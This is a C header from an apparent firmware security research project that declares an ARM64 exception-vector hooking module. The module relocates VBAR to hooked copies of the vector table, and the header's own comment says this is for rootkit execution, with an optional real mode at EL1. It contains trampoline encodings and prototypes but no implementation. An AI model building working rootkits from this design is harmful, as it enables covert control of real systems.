/** @file
  Exception Vector Table Hook Emulation - Header

  Models ARM VBAR (Vector Base Address Register) relocation attacks.
  The vector table has 16 entries (4 exception types x 4 source ELs),
  each 0x80 bytes. By relocating VBAR to attacker-controlled memory,
  all exceptions can be intercepted for rootkit execution.

  When BARZAKH_FUNCTIONAL is defined, the module performs real VBAR
  relocation on AArch64 (EL1). Otherwise all operations are SIMULATED.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#ifndef EXCEPTION_VECTOR_HOOK_H_
#define EXCEPTION_VECTOR_HOOK_H_

#include <Uefi.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/DebugLib.h>
#include <Library/PrintLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <BarzakhMode.h>

#define VHOOK_DEBUG_PREFIX  "[VecHook-Emu] "

//
// ARM64 vector table geometry
//
#define VBAR_ENTRY_SIZE         0x80    // 128 bytes per vector entry
#define VBAR_NUM_ENTRIES        16      // 4 types x 4 source levels
#define VBAR_TABLE_SIZE         (VBAR_ENTRY_SIZE * VBAR_NUM_ENTRIES)  // 2048 bytes
#define VBAR_ALIGNMENT          0x800   // Must be 2KB aligned

//
// Exception types (offset within each group of 4)
//
#define VBAR_TYPE_SYNC          0  // Synchronous exception
#define VBAR_TYPE_IRQ           1  // IRQ/vIRQ
#define VBAR_TYPE_FIQ           2  // FIQ/vFIQ
#define VBAR_TYPE_SERROR        3  // SError/vSError

//
// Source exception levels (groups of 4 entries)
//
#define VBAR_SRC_CURR_SP0       0  // Current EL with SP_EL0
#define VBAR_SRC_CURR_SPX       1  // Current EL with SP_ELx
#define VBAR_SRC_LOWER_A64      2  // Lower EL using AArch64
#define VBAR_SRC_LOWER_A32      3  // Lower EL using AArch32

//
// Vector entry index calculation
//
#define VBAR_ENTRY_INDEX(src, type)  ((src) * 4 + (type))
#define VBAR_ENTRY_OFFSET(src, type) (VBAR_ENTRY_INDEX(src, type) * VBAR_ENTRY_SIZE)

//
// Simulated VBAR addresses
//
#define VBAR_EL1_ORIGINAL       0xFFFF000010081000
#define VBAR_EL2_ORIGINAL       0x0000000040001000
#define VBAR_EL3_ORIGINAL       0x000000000E100000
#define VBAR_HOOK_ALLOC_BASE    0xFFFF000012000000

//
// ARM64 branch instruction encoding (for hook trampoline)
//
#define ARM64_NOP               0xD503201F
#define ARM64_BR_X16            0xD61F0200  // BR X16
#define ARM64_LDR_X16_NEXT      0x58000050  // LDR X16, [PC+8]

typedef struct {
  UINT32    Instructions[VBAR_ENTRY_SIZE / sizeof(UINT32)];
} VBAR_ENTRY;

typedef struct {
  VBAR_ENTRY  Entries[VBAR_NUM_ENTRIES];
} VBAR_TABLE;

typedef struct {
  UINT32    EntryIndex;
  UINT64    OriginalAddr;
  UINT64    HookAddr;
  BOOLEAN   IsHooked;
} VBAR_HOOK_INFO;

typedef enum {
  VhookStateUninitialized = 0,
  VhookStateVbarRead,
  VhookStateTableCopied,
  VhookStateTableModified,
  VhookStateVbarRedirected
} VHOOK_STATE;

typedef struct {
  BOOLEAN         Initialized;
  VHOOK_STATE     State;

  // Original VBAR values
  UINT64          OrigVbarEl1;
  UINT64          OrigVbarEl2;
  UINT64          OrigVbarEl3;

  // Hook table
  UINT64          HookTableAddr;
  VBAR_HOOK_INFO  Hooks[VBAR_NUM_ENTRIES];
  UINT32          HookCount;

  // Target
  UINT32          TargetEl;
  UINT64          NewVbarValue;
  BOOLEAN         VbarRedirected;
} VHOOK_CONTEXT;

EFI_STATUS
EFIAPI
InitializeVectorHook (
  OUT VHOOK_CONTEXT  *Context
  );

EFI_STATUS
EFIAPI
ReadVbarRegisters (
  IN OUT VHOOK_CONTEXT  *Context
  );

EFI_STATUS
EFIAPI
CopyVectorTable (
  IN OUT VHOOK_CONTEXT  *Context
  );

EFI_STATUS
EFIAPI
PatchVectorEntries (
  IN OUT VHOOK_CONTEXT  *Context
  );

EFI_STATUS
EFIAPI
RedirectVbar (
  IN OUT VHOOK_CONTEXT  *Context
  );

VOID
EFIAPI
LogVectorHookStatus (
  IN     VHOOK_CONTEXT  *Context
  );

#endif // EXCEPTION_VECTOR_HOOK_H_
